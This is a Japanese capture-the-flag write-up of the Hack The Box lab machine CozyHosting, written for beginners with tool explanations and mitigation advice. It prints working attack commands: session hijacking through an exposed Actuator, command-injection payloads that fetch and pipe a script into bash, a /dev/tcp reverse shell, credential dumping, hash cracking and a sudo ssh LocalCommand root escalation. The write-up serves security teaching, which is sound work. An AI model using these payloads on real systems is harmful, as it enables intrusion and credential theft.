---
title: "[ HTB ] CozyHosting | Writeup"
emoji: "🛏️"
type: "tech"
topics: ["Security", "writeup", "Cyber Security", "hacking", "Hack The Box"]
published: false
---

## README

- 初学者の、初学者による、初学者のためのWriteupです。
- 「なぜその判断に至ったのか」「なぜそのコマンドを実行しようと考えたのか」など、各アクションに至った思考回路部分についても触れています。
- 尚、一部正確でない表現が含まれている場合があります。
- 一応実務でもペネトレーションテストをやっているので、（たまに）実務目線のコメントも挟みます。

### 想定読者

- HTBなどのCTF/ペネトレーションテスト演習に興味がある初学者
- Linuxの基本的なコマンド操作、HTTP/SMB/Kerberosなどのプロトコルについてある程度の前提知識がある方(本記事内でも簡単な用語解説を挟んでいます)

## Machine Profile

Machine Name: CozyHosting
Difficulty: Easy
OS: Linux

https://app.hackthebox.com/machines/CozyHosting

## Setup

対象IPを`RHOSTS`という環境変数に入れておく。IP手打ちなどによるミスを防止

```sh
┌──(root㉿5602a1b7889d)-[~/CozyHosting]
└─# echo 'export RHOSTS="10.10.11.230"' | tee -a .zshrc
export RHOSTS="10.10.11.230"
```

設定反映

```sh
┌──(root㉿5602a1b7889d)-[~/CozyHosting]
└─# source .zshrc
```

動作確認＆疎通確認

```sh
┌──(root㉿5602a1b7889d)-[~/CozyHosting]
└─# ping -c 4 ${RHOSTS}
PING 10.10.11.230 (10.10.11.230) 56(84) bytes of data.
64 bytes from 10.10.11.230: icmp_seq=1 ttl=63 time=24.1 ms
64 bytes from 10.10.11.230: icmp_seq=2 ttl=63 time=23.8 ms
64 bytes from 10.10.11.230: icmp_seq=3 ttl=63 time=24.5 ms
64 bytes from 10.10.11.230: icmp_seq=4 ttl=63 time=23.9 ms

--- 10.10.11.230 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 23.812/24.075/24.541/0.280 ms
```

## Enumeration

### Nmap

まずはNmapでポートスキャンを行う。

```sh
┌──(root㉿5602a1b7889d)-[~/CozyHosting]
└─# nmap -sSV -Pn -n -r -T4 -oN nmap_top1000.txt ${RHOSTS}
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-12 10:00 +0000
Nmap scan report for 10.10.11.230
Host is up (0.024s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`-sSV`: SYNスキャン＋Versionスキャン  
`-Pn`: Pingチェック無効化  
デフォルトだとPingが通らないとスキャンが始まらないが、このチェックを省略し若干の時短を図る  
`-n`: 名前解決無効化。同じく時短目的  
`-r`: ポートスキャンを昇順に行う。特に意味はない、好み  
フルポートスキャン中にWiresharkなどで覗き見した際に、いまどこまで回っているかを確認するために使用することが多い  
`-T 4`: 並列スキャン数増加。未指定時はデフォルトの3が選択される、時短  
`-oN`: 結果を保存するファイル名を指定  

開いているのはSSH(22)と、nginxがフロントに立つHTTP(80)の2つだけ。Webアプリ側に突破口がありそうなので、まずはHTTPを掘っていく。

### 80/http

> 80/tcp open  http    nginx 1.18.0 (Ubuntu)

:::details nginx(エンジンエックス)とは？
読み方: エンジンエックス  
意味: 軽量・高速で動作するWebサーバ・リバースプロキシ。Apacheと並ぶWebサーバの定番で、HTTP(S)の受け口として前段に置き、裏側のアプリケーションサーバ(今回で言えばSpring Boot)にリクエストを流す構成でよく見かける。
:::

ブラウザで`http://10.10.11.230`にアクセスすると、`cozyhosting.htb`にリダイレクトされる。名前解決できないと表示できないので、`/etc/hosts`にエントリを追加しておく。

```sh
┌──(root㉿5602a1b7889d)-[~/CozyHosting]
└─# echo "${RHOSTS}  cozyhosting.htb" | tee -a /etc/hosts
10.10.11.230  cozyhosting.htb
```

改めてアクセスすると、ホスティングサービスを謳うWebサイトが表示される。見た目だけでは何もわからないので、`ffuf`でディレクトリ列挙にかける。

:::details ffuf(エフユーエフエフ)とは？
読み方: エフユーエフエフ  
正式名称: Fuzz Faster U Fool  
意味: Go製の高速ファジングツール。URLやパラメータ内に`FUZZ`(キーワードは任意に変更可)というマーカーを置くと、そこにワードリストの各行を順番に当てはめてリクエストを投げてくれる。ディレクトリ・ファイル・サブドメイン・パラメータ名の列挙など、何でも使える万能選手。
:::

```sh
┌──(root㉿5602a1b7889d)-[~/CozyHosting]
└─# ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100
(略)
index                   [Status: 200, Size: 8930, Words: 1771, Lines: 128]
login                   [Status: 200, Size: 2224, Words: 123, Lines: 68]
admin                   [Status: 401, Size: 97, Words: 7, Lines: 3]
logout                  [Status: 204, Size: 0, Words: 1, Lines: 1]
error                   [Status: 500, Size: 73, Words: 5, Lines: 1]
```

`-w`: ワードリストのパス  
`-u`: 対象URL(`FFUZ`の部分にワードリストの各行が入る)  
`-ic`: ワードリスト中のコメント行を無視  
`-t`: 並列スレッド数  

`/login`、`/admin`、`/error`あたりが目を引く。`/admin`は401が返っているので何かしらの認証が必要そう。`/login`に行って適当なクレデンシャル(`admin:admin`など)で突っ込んでみても弾かれる。

次に`/error`を見にいく。

> Whitelabel Error Page

これはSpring Bootのデフォルトのエラーページ。アプリの正体がSpring Bootだと分かったので、Spring Boot専用のワードリストで再度ファジングをかける。

:::details Spring Boot(スプリングブート)とは？
読み方: スプリングブート  
意味: Java製のアプリケーションフレームワーク。設定を極力減らしてWebアプリやAPIサーバを即席で立てられるのが売り。デフォルトで有効になっているエンドポイント(`/error`、`/actuator`配下など)が多く、設定不備で情報漏洩や管理機能の露出につながるケースがちょくちょくある。
:::

```sh
┌──(root㉿5602a1b7889d)-[~/CozyHosting]
└─# ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100
(略)
actuator                [Status: 200, Size: 745, Words: 1, Lines: 1]
actuator/health         [Status: 200, Size: 15, Words: 1, Lines: 1]
actuator/sessions       [Status: 200, Size: 93, Words: 1, Lines: 1]
actuator/mappings       [Status: 200, Size: 16248, Words: 1, Lines: 1]
actuator/env            [Status: 200, Size: 2254, Words: 1, Lines: 1]
```

`/actuator`配下がばっちり露出している。

:::details Actuator(アクチュエータ)とは？
読み方: アクチュエータ  
意味: Spring Bootアプリの運用監視用モジュール。ヘルスチェック・環境変数・エンドポイント一覧・セッション情報などを公開するエンドポイント群を提供する。開発中は便利だが、本番環境で外部に露出していると大体ロクなことにならないやつ。
:::

:::message
Actuatorは本番環境では認証をかけるか、そもそも外部公開しないのが基本。それが公開状態になっているので、設定不備の脆弱性に該当する。
:::

## Foothold

### 既存セッションの乗っ取り

`/actuator/sessions`を覗くと、ログイン中ユーザのセッションIDが見える。

```sh
┌──(root㉿5602a1b7889d)-[~/CozyHosting]
└─# curl -s http://cozyhosting.htb/actuator/sessions
{"kanderson":"8DEB69FD1D8E1EBC26B00C84E9A3E303"}
```

> {"kanderson":"8DEB69FD1D8E1EBC26B00C84E9A3E303"}

`kanderson`ユーザのセッションIDが丸見え。これをブラウザのCookie(`JSESSIONID`)にセットすれば、そのユーザとしてログイン済みの状態になる。

:::message
認証済みユーザのセッション識別子がノーガードで公開されており、セッション固定/セッションハイジャックが成立する。これも設定不備の脆弱性に該当し、Actuatorの不適切な公開が根本原因。
:::

Cookieを差し替えた上で`/admin`にアクセスすると、`K. Anderson`としてログイン済みの管理ダッシュボードに入れる。

### Command Injection

ダッシュボードの下部に「ホスト名とユーザ名を入力して自動パッチ適用」というフォームがある。試しに`username=test`、`hostname=127.0.0.1`で投げてみるとエラーが返り、文言から裏側で以下のようなコマンドが組み立てられていることが推測できる。

```
ssh -i id_rsa <username>@<hostname>
```

`hostname`側はバリデーションがきつそうなので、`username`側でコマンドインジェクションを試す。

:::details Command Injection(コマンドインジェクション)とは？
読み方: コマンドインジェクション  
意味: アプリケーションがユーザ入力をシェルコマンドにそのまま流し込んでいる場合、`;`や`|`などのメタ文字を混ぜ込むことで任意コマンドを実行させる攻撃。今回のように「裏でSSHを叩くフォーム」はコマンド組み立て部分が怪しいので、まず疑ってかかる定番ポイント。
:::

試したところ、`username`フィールドはスペースを弾いてくる。シェルの区切り文字として`${IFS}`(Internal Field Separator、デフォルトでスペース＋タブ＋改行)を使うのが定石なので、これを噛ませる。

:::details なぜ`${IFS}`を使うのか
URLエンコードした`%20`やタブ・改行を直接送って弾かれる場合も、`${IFS}`はシェル展開時にスペース扱いになる単なる変数参照なので、入力検証を素通りしつつシェル実行時だけ区切り文字として機能してくれる。コマンドインジェクション時の空白迂回の定番テク。
:::

まずは外部にリクエストを飛ばせるか、攻撃側でHTTPサーバを立てて`curl`で叩かせて確認する。

```sh
┌──(root㉿5602a1b7889d)-[~/CozyHosting]
└─# python3 -m http.server 7000
Serving HTTP on 0.0.0.0 port 7000 (http://0.0.0.0:7000/) ...
```

フォーム側のユーザ名に以下のペイロードを入れて送信する。

```
test;curl${IFS}http://10.10.14.49:7000;
```

攻撃側のHTTPサーバにアクセスログが残れば成功。実際、GETリクエストが着弾する。

```
10.10.11.230 - - [12/Oct/2026 10:12:34] "GET / HTTP/1.1" 200 -
```

RCE成立なので、リバースシェル用スクリプトをホスティングして実行させる。

```sh
┌──(root㉿5602a1b7889d)-[~/CozyHosting]
└─# echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/4444 0>&1' > rev.sh
```

別タブで`nc`リスナを立てておく。

```sh
┌──(root㉿5602a1b7889d)-[~/CozyHosting]
└─# nc -lnvp 4444
listening on [any] 4444 ...
```

フォームのユーザ名に以下のペイロードを入れて送信。

```
test;curl${IFS}http://10.10.14.49:7000/rev.sh|bash;
```

リスナ側に`app`ユーザとしてシェルが降ってくる。

```sh
┌──(root㉿5602a1b7889d)-[~/CozyHosting]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.49] from (UNKNOWN) [10.10.11.230] 54312
sh: 0: can't access tty; job control turned off
$ whoami
app
```

PTYがないと操作性が悪いので、`script`で安定化しておく。

```sh
$ script /dev/null -c bash
```

:::message
サーバ側で組み立てられるシェルコマンドにユーザ入力をそのまま埋め込んでいるのが原因。入力バリデーション漏れによるコマンドインジェクションの脆弱性に該当する。実務では「シェルを呼ばずに言語ネイティブのSSHライブラリで組み立てる」「どうしてもシェル経由なら引数を配列で渡してシェル展開を回避する」といった対策になる。
:::

## Privilege Escalation

### Get to Josh

カレントディレクトリを確認すると`/app`に居て、Spring BootアプリのJARファイルがそのまま置いてある。

```sh
app@cozyhosting:/app$ ls
cloudhosting-0.0.1.jar
```

:::details JAR(ジャー)とは？
読み方: ジャー  
正式名称: Java ARchive  
意味: Javaのクラスファイルやリソースをまとめた実質的にZIP形式のアーカイブ。中身を`unzip`で展開してソースや設定ファイルを漁れるので、Javaアプリ案件を見つけたらまず剥がしにいく。
:::

書き込める`/tmp`配下に展開する。

```sh
app@cozyhosting:/app$ unzip -d /tmp/app cloudhosting-0.0.1.jar
```

Spring Bootなので、まず見るべきは`application.properties`。

```sh
app@cozyhosting:/app$ cat /tmp/app/BOOT-INF/classes/application.properties
server.address=127.0.0.1
server.servlet.session.timeout=10m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
spring.jpa.hibernate.ddl-auto=update
```

> spring.datasource.username=postgres  
> spring.datasource.password=Vg&nvzAQ7XxR

ハードコードされたPostgreSQLのクレデンシャルが拾えた。この時点でcreds.txtを作っておく。

```txt:creds.txt
postgres:Vg&nvzAQ7XxR
```

:::message
アプリ内に平文でDB認証情報が書かれていたのが問題。設定不備というより「シークレットのハードコード」というコーディング上の脆弱性。実務では環境変数やシークレットマネージャ(AWS Secrets Manager等)に逃がすのが基本。
:::

ローカルのPostgreSQLに接続して覗く。

```sh
app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgres
Password for user postgres: Vg&nvzAQ7XxR
postgres=# \list
                                 List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 ...
```

`cozyhosting`データベースに繋ぎ替えて`users`テーブルを見る。

```sh
postgres=# \connect cozyhosting
cozyhosting=# \dt
          List of relations
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres

cozyhosting=# select * from users;
    name    |                           password                           |  role
------------+--------------------------------------------------------------+---------
 kanderson  | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim  | User
 admin      | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm  | Admin
```

bcryptハッシュが2件。先頭の`$2a$10$...`からも分かるが、一応`hashid`でも確認しておく。

```sh
┌──(root㉿5602a1b7889d)-[~/CozyHosting]
└─# hashid '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
Analyzing '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
[+] Blowfish(OpenBSD)
[+] Woltlab Burning Board 4.x
[+] bcrypt
```

bcrypt確定。`admin`側のハッシュを`hash.txt`に保存してHashcatで殴る。

:::details Hashcat(ハッシュキャット)とは？
読み方: ハッシュキャット  
意味: GPU対応の高速ハッシュクラッカー。モード番号(`-m`)でハッシュ種別を指定して、辞書やルールベースで総当たりしてくれる定番ツール。bcryptは`-m 3200`。
:::

```sh
┌──(root㉿5602a1b7889d)-[~/CozyHosting]
└─# hashcat hash.txt -m 3200 /usr/share/wordlists/rockyou.txt
(略)
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

`admin`のパスワードは`manchesterunited`と判明。これがそのままLinuxユーザとしても使い回されているパターンがあるので、`/etc/passwd`でログインできそうなユーザを探す。

```sh
app@cozyhosting:/app$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
josh:x:1003:1003:,,,:/home/josh:/bin/bash
```

`josh`が居る。得られたパスワードでSSHを試す。

```sh
┌──(root㉿5602a1b7889d)-[~/CozyHosting]
└─# ssh josh@${RHOSTS}
josh@10.10.11.230's password: manchesterunited
josh@cozyhosting:~$ whoami
josh
```

ログイン成功。パスワードの使い回しが刺さった形。creds.txtも更新しておく。

```txt:creds.txt
postgres:Vg&nvzAQ7XxR
admin:manchesterunited  // new!
josh:manchesterunited   // new!
```

user.txtを回収。

```sh
josh@cozyhosting:~$ cat /home/josh/user.txt
```

:::message
アプリ上の`admin`アカウントとOSユーザ`josh`で同じパスワードが使い回されていたことで横展開が成立。認証情報の使い回しという、どの環境でも地味に多い脆弱性。
:::

### Get to Root

まずは`sudo -l`で何が叩けるか確認するのが定石。

```sh
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: manchesterunited
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, ...

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

> (root) /usr/bin/ssh *

`ssh`を`root`権限で任意引数付きで叩ける。GTFOBinsにもほぼ同じエントリがある、見慣れた権限昇格パス[^1]。

:::details なぜsshで権限昇格できるのか
`ssh`には`-o PermitLocalCommand=yes -o LocalCommand=<cmd>`というオプションがあり、接続成功後にクライアント側で任意コマンドを実行できる。これを`sudo /usr/bin/ssh`で呼ぶと、`LocalCommand`で指定した`/bin/bash`がroot権限で起動する、という仕組み。
:::

```sh
josh@cozyhosting:~$ sudo /usr/bin/ssh -o PermitLocalCommand=yes -o 'LocalCommand=/bin/bash' josh@127.0.0.1
(略)
root@cozyhosting:~# whoami
root
root@cozyhosting:~# id
uid=0(root) gid=0(root) groups=0(root)
```

root取得。root.txtを回収する。

```sh
root@cozyhosting:~# cat /root/root.txt
```

:::message
`sudo`の設定で、ローカルコマンド実行オプションを封じないまま`ssh`をroot実行許可してしまっているのが原因。sudoersの設定不備による権限昇格の脆弱性。
:::

## まとめ

改めて攻撃チェーンを整理すると以下の通り。

1. Spring BootアプリのActuatorが外部公開されており、`/actuator/sessions`から`kanderson`のセッションIDを窃取
2. セッションハイジャックで`/admin`に侵入、パッチ適用フォームの`username`パラメータでコマンドインジェクション(`${IFS}`で空白を回避)、`app`ユーザのリバースシェルを取得
3. `/app`配下のJARを`unzip`で剥がし、`application.properties`からハードコードされたPostgreSQL認証情報(`postgres:Vg&nvzAQ7XxR`)を取得
4. DBの`users`テーブルからbcryptハッシュを抽出、Hashcatで`admin:manchesterunited`を復元
5. 認証情報の使い回しを突いて`josh`としてSSHログイン、`sudo -l`で`/usr/bin/ssh`のroot実行許可を発見
6. `sudo ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/bash josh@127.0.0.1`でローカルコマンド実行オプションを悪用し、rootシェルを獲得

公式分類通りEasyだけど、Spring Boot特有のActuator → セッションハイジャック → コマンドインジェクション → JARリバースエンジニアリング → DB → ハッシュクラック → sudo misconfig、と手数が多くて教材としてはすごく良かった。「怪しいフォームを見たらまずコマンドインジェクションを疑う」「Javaアプリに当たったらまずJARを剥がす」の基本2セットを体に染み込ませるのに丁度いいマシン。

ちなみにHTBなのでやらないですが、実務では後始末もやっています。

## 免責事項

- 本記事はセキュリティ学習・知識共有を目的としています。
- 記載しているコマンド・攻撃手法は、自分が管理する環境、または明示的に許可を得た環境でのみ実行してください。他者の環境に無断で使用した場合、不正アクセス禁止法などの法令に抵触する可能性があります。
- 本記事の内容によって生じたいかなる損害についても、筆者は責任を負いかねます。

## HTBのポリシーについて

Hack The Boxでは、Retired状態のマシンに限りWriteupの公開が認められています。Activeなマシンの解法を公開する行為は利用規約違反にあたるため、本記事の対象マシンは執筆時点でRetiredであることを確認しています。

[^1]: https://gtfobins.github.io/gtfobins/ssh/#sudo
